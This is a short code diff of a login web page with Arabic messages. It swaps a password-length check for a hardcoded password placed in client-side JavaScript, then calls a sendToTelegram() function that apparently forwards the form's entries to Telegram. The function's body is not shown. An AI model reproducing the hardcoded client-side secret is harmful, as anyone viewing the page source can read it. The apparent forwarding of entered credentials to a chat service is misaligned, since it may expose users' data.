@@ -183,7 +183,7 @@
         <!-- Login Button -->
              <a href="rowan.html" class="login-button">Login</a>
         <!-- Additional icon and text -->
-        <a href="rowan.html" class="more-info">
+        <a href="https://www.youtube.com/watch?v=ikMmzrnkRgM" class="more-info">
             <img src="telegram.png" alt="More Info Icon"> More Info
         </a>
         <!-- New Auth buttons -->
@@ -260,14 +260,16 @@
                 return;
             }
 
-            // Validate password
-            if (password.length < 6) {
-                errorMessage.textContent = 'يجب أن تتكون كلمة المرور من 6 أحرف على الأقل.';
-                errorMessage.style.display = 'block';
-                event.preventDefault();
-                return;
-            }
+         
+const specificPassword = 'RowanRoro233'; 
 
+// التحقق من كلمة المرور
+if (password !== specificPassword) {
+    errorMessage.textContent = 'كلمة المرور غير صحيحة. يرجى إدخال كلمة المرور المحددة.';
+    errorMessage.style.display = 'block';
+    event.preventDefault();
+    return;
+}
             sendToTelegram();
         });
     </script>
